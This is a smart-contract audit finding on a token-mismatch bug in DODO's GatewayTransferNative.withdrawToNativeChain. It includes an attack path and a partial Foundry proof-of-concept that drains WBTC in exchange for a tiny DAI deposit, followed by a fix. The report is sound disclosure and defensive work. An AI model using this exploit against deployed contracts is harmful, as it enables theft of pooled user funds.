# `GatewayTransferNative.withdrawToNativeChain` Misattributes Swap Output Amount from `params.toToken` to `decoded.targetZRC20`


### Summary

When [`GatewayTransferNative.withdrawToNativeChain`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L442-L483) executes an internal DODO swap, the resulting `outputAmount` is the amount of `params.toToken`. However, the subsequent logic for withdrawing these funds to an external chain incorrectly assumes this `outputAmount` is the amount of `decoded.targetZRC20`. If an attacker crafts a `message` where `params.toToken` is different from `decoded.targetZRC20`, the contract will misinterpret `outputAmount`. This can lead to the contract attempting to send its own `decoded.targetZRC20` funds using the amount derived from `params.toToken`, potentially causing significant theft, especially if there's a decimal or value disparity between the two tokens.

### Root Cause

The vulnerability exists because `GatewayTransferNative.withdrawToNativeChain` does not validate that the token type of the DODO swap's output (`params.toToken`) matches the token type intended for the final withdrawal operation (`decoded.targetZRC20`).

1.  **User-Controlled Inputs via `message`:** The user calls `withdrawToNativeChain` providing, among other arguments, a `bytes calldata message`. This `message` is decoded using `SwapDataHelperLib.decodeMessage`.

    - `decoded.swapDataZ` is used to derive `MixSwapParams memory params`. `params.toToken` is the token that the DODO swap will output.
    - `decoded.targetZRC20` specifies the ZRC20 token that the user intends to be processed by the withdrawal handlers (`_handleBitcoinWithdraw` or `_handleEvmOrSolanaWithdraw`).
    - Both `params.toToken` and `decoded.targetZRC20` are effectively attacker-controlled.

2.  **DODO Swap Execution:**
    The `_doMixSwap` function is called using `decoded.swapDataZ`. It performs the DODO swap and returns `outputAmount`, which is the amount of `params.toToken`.

    ```solidity
    uint256 outputAmount = _doMixSwap(decoded.swapDataZ, currentAmount, params);
    // Here, outputAmount is the amount of params.toToken
    ```

3.  **Withdrawal Processing with Misattributed Token Type:**
    The `outputAmount` is then passed to either `_handleBitcoinWithdraw` or `_handleEvmOrSolanaWithdraw`. These handler functions, however, use `decoded.targetZRC20` to determine the token they are operating on, while using `outputAmount` as its amount.

    For example, in `_handleEvmOrSolanaWithdraw`:

    ```solidity
    function _handleEvmOrSolanaWithdraw(
        bytes32 externalId,
        DecodedMessage memory decoded, // decoded.targetZRC20 is more valuable tokens
        uint256 outputAmount,         // outputAmount is the amount of less valuable tokens
        bytes memory receiver
    ) internal returns (uint256 amountsOutTarget) {
        (address gasZRC20, uint256 gasFee) = IZRC20(decoded.targetZRC20).withdrawGasFeeWithGasLimit(gasLimit);

        if (decoded.targetZRC20 == gasZRC20) {
            // ...
            // @audit Approves contract's OWN decoded.targetZRC20
            IZRC20(decoded.targetZRC20).approve(address(gateway), outputAmount + gasFee);

            // @audit Withdraws (outputAmount - gasFee) of contract's OWN decoded.targetZRC20
            withdrawAndCall(
                externalId, decoded.contractAddress, decoded.targetZRC20, outputAmount - gasFee, receiver, encoded_data
            );
            amountsOutTarget = outputAmount - gasFee;
        } else {
            // @audit Similar bug in _swapAndSendERC20Tokens if this path is taken:
            amountsOutTarget = _swapAndSendERC20Tokens(decoded.targetZRC20, gasZRC20, gasFee, outputAmount);
            // ... then withdrawAndCall with amountsOutTarget ...
        }
    }
    ```

    Crucially, **there is no validation step `require(params.toToken == decoded.targetZRC20);`** after `_doMixSwap` returns and before `outputAmount` is passed to the withdrawal handlers. This allows `outputAmount` the amount of `params.toToken` to be incorrectly treated as the amount of `decoded.targetZRC20` when approving and transferring/withdrawing `decoded.targetZRC20` from `GatewayTransferNative`'s own balance.

### Internal Pre-conditions

1.  `GatewayTransferNative` must hold a sufficient balance of `decoded.targetZRC20`. This is plausible due to the contract's refund mechanisms.
2.  The DODO swap from the user's deposited `zrc20` to `params.toToken` must be feasible and result in a non-zero `outputAmount`.

### External Pre-conditions

1.  DODO protocol on ZetaChain has liquidity for the swap that produces `params.toToken`.
2.  The ZetaChain gateways must be operational.

### Attack Path

1.  **Pre-condition:** `GatewayTransferNative` holds `1 WBTC.ETH` (8 decimals). Attacker has `1 DAI.ETH` (18 decimals).
2.  **Attacker's Action:** Attacker calls `GatewayTransferNative.withdrawToNativeChain`:
    - `zrc20`: `DAI.ETH`
    - `amount`: `1e8` wei of DAI.ETH. Attacker ensures approval for this.
    - `message`: Crafted such that after `SwapDataHelperLib.decodeMessage`:
      - `decoded.dstChainId`: An EVM chain ID where attacker can receive WBTC.ETH (e.g., Ethereum itself).
      - `decoded.targetZRC20`: `address(WBTC.ETH)` (the valuable token to drain).
      - `decoded.receiver`: Attacker's address on the destination EVM chain.
      - `decoded.contractAddress`: GatewaySend address on the destination chain.
      - `decoded.swapDataZ`:
        - `params.fromToken`: `DAI.ETH` (matches the deposited `zrc20`).
        - `params.toToken`: `DAI.ETH` Swaps DAI->DAI but it can be any tokens.
        - `params.fromTokenAmount`: `1e8` (all deposited DAI).
        - `params.minReturnAmount`: `0`.
3.  **Execution within `withdrawToNativeChain`:**
    - User's `1e8` wei of `DAI.ETH` are transferred to `GatewayTransferNative`. Assume zero fees, the `currentAmount` is `1e8` wei of `DAI.ETH`.
    - `_doMixSwap` is called. It swaps `1e8` wei of `DAI.ETH` to `1e8` wei `DAI.ETH`. So, `outputAmount = 1e8`.
    - The `else` block (for EVM/Solana withdrawal) is taken. `_handleEvmOrSolanaWithdraw` is called with `decoded.targetZRC20 = WBTC.ETH` and `outputAmount = 1e8`.
    - Inside `_handleEvmOrSolanaWithdraw`:
      - Assuming `gasZRC20` for `WBTC.ETH` is `WBTC.ETH` and the gas fee is zero.
      - `withdrawAndCall` is called with `WBTC.ETH` as the `targetZRC20` and `outputAmount` is `1e8` from `DAI.ETH` swap output.
4.  **Result:** Attacker deposits `1e8` wei of `DAI.ETH` and withdraws `1e8` `WBTC.ETH` (1 BTC).

### Impact

If `params.toToken` and `decoded.targetZRC20` differ, `GatewayTransferNative` misinterprets `outputAmount`. This can lead to:

1.  **Theft of Valuable Assets:** An attacker can drain the contract's balance of `decoded.targetZRC20` by manipulating `outputAmount`.
2.  **Reverts/DoS:** If the miscalculated amounts lead to insufficient balance errors for `decoded.targetZRC20`, the transaction will revert.

    vm.label(address(zrc20DAI), "zrc20DAI");
    vm.label(address(dai), "dai");

    // Balances
    zrc20DAI.mint(attacker, amount); // 1 DAI.ETH
    zrc20WBTC.mint(address(gatewayTransferNative), amount); // 1 WBTC.ETH e.g. for refund failed cross-chain tx
    zrc20DAI.mint(address(dodoRouteProxyZ), amount); // Swaps Liquidity
    wbtc.mint(address(gatewayB), amount); // Escrowed Liquidity

    // Gateways
    gatewayB.setZRC20(address(wbtc), address(zrc20WBTC));
    zrc20WBTC.setGasFee(0); // For simplicity
    zrc20WBTC.setGasZRC20(address(zrc20WBTC)); // For simplicity

    // 1 DAI = 1 DAI, no slippage for simplicity
    dodoRouteProxyZ.setPrice(address(zrc20DAI), address(zrc20DAI), 1e18);

    // Approvals
    vm.prank(attacker);
    zrc20DAI.approve(address(gatewayTransferNative), amount);

    uint32 dstChainId = 2;
    address targetZRC20 = address(zrc20WBTC); // !!!
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);
    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20DAI), // !!!
        address(zrc20DAI), // !!! It can be any token to drain BTC
        amount,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenB = abi.encodePacked(address(wbtc));
    bytes memory toTokenB = abi.encodePacked(address(wbtc));
    bytes memory swapDataB = "";
    bytes memory accounts = "";
    bytes memory message = encodeMessage(
        dstChainId,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenB, toTokenB, swapDataB),
        accounts
    );

    vm.prank(attacker);
    gatewayTransferNative.withdrawToNativeChain(address(zrc20DAI), amount, message);

    // Deposit less than 1 DAI (1 USD) got 1 WBTC (105,000 USD)
    assertEq(zrc20DAI.balanceOf(attacker), 0);
    assertEq(wbtc.balanceOf(attacker), amount);
}

### Mitigation

In `GatewayTransferNative`, within `withdrawToNativeChain`, after `_doMixSwap` returns `outputAmount` and before calling the withdrawal handlers (`_handleBitcoinWithdraw`, `_handleEvmOrSolanaWithdraw`):

```solidity
// ...
uint256 outputAmount = _doMixSwap(decoded.swapDataZ, currentAmount, params);

// NEW CHECK: Ensure the token type of outputAmount matches what the withdrawal/final transfer logic expects.
if (decoded.swapDataZ.length > 0) { // A DODO swap occurred
    require(params.toToken == decoded.targetZRC20, "GTN-W: Swap output token must match final targetZRC20");
} else { // No DODO swap occurred via _doMixSwap, outputAmount is of type zrc20 (initial deposit)
    require(zrc20 == decoded.targetZRC20, "GTN-W: Deposited token must match final targetZRC20 if no swap");
}

// Now proceed with withdrawal/transfer logic using outputAmount, confident that outputAmount is of type decoded.targetZRC20.

```
